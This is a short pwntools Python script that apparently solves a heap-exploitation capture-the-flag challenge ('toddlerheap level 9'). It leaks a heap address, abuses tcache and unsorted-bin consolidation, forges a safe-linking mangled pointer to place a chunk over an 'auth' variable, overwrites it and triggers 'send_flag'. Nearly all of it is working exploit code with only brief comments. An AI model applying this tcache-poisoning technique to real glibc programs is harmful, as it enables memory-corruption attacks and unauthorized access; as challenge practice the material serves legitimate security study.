from pwn import * 

binary = './toddlerheap_level9_patched'
p = process(binary)
s = '''
b malloc
b free
'''

auth = 0x00404260
p.sendline("malloc 0 248")
p.sendline("free 0")
p.sendline("malloc 0 248")
p.sendline("puts 0")

p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')

p.sendline("free 0")
heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x370


for i in range(0, 7):
	p.sendline(f"malloc {i} 248")

p.sendline(f"malloc 7 248") # for later consolidation
p.sendline(f"malloc 8 248") # victim chunk
p.sendline(f"malloc 9 24") # prevent consolidation 

for i in range(0, 7):
	p.sendline(f"free {i}")
p.sendline(f"free 8") # freeing the victim chunk, it goes to unsortedbin

p.sendline(f"free 7") # this chunk consolidates with the victim chunk, the unsortedbin gets larger

p.sendline("malloc 0 248")
p.sendline(f"free 8") # this goes to tcache



p.sendline("malloc 10 504")

mangled_ptr = ((chunk_addr >> 12) ^ auth)


p.sendline("safer_read 10")
p.sendline(b'A' * 0x100 + p64(mangled_ptr))



p.sendline("malloc 11 248")
p.sendline("malloc 12 248")

p.sendline("safer_read 12")
p.sendline(b'A' * 0x8)

p.sendline("send_flag")
#gdb.attach(p, s)
p.interactive()
